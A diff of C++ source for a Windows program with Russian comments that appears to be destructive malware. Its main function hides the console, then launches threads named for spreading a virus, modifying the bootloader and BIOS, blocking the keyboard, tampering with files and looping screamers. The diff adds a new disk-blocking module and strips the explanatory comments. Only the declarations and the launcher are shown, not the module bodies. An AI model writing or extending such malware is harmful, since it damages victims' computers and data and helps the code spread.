@@ -24,16 +24,14 @@ void ModifyBootloader();
 void ModifyBIOS();
 void OpenRandomAppsAndSites();
 void ScreamerLoop();
+void InitializeDiskBlockModule(); // НОВЫЙ МОДУЛЬ
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Скрываем окно
     HWND hWnd = GetConsoleWindow();
     ShowWindow(hWnd, SW_HIDE);
 
-    // Создаём множество потоков для параллельной работы
     std::vector<std::thread> threads;
 
-    // Основные модули
     threads.emplace_back(InitializeScareModule);
     threads.emplace_back(InitializeFileSystemModule);
     threads.emplace_back(InitializeKeyboardBlockModule);
@@ -43,16 +41,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     threads.emplace_back(ModifyBIOS);
     threads.emplace_back(OpenRandomAppsAndSites);
     threads.emplace_back(SpreadVirus);
+    threads.emplace_back(InitializeDiskBlockModule); // ЗАПУСКАЕМ
 
-    // Бесконечный цикл скримеров
     threads.emplace_back(ScreamerLoop);
 
-    // Ждём завершения всех потоков (никогда не произойдёт)
     for (auto& t : threads) {
         if (t.joinable()) t.detach();
     }
 
-    // Вечный цикл, чтобы программа не закрывалась
     while (true) {
         Sleep(10000);
     }
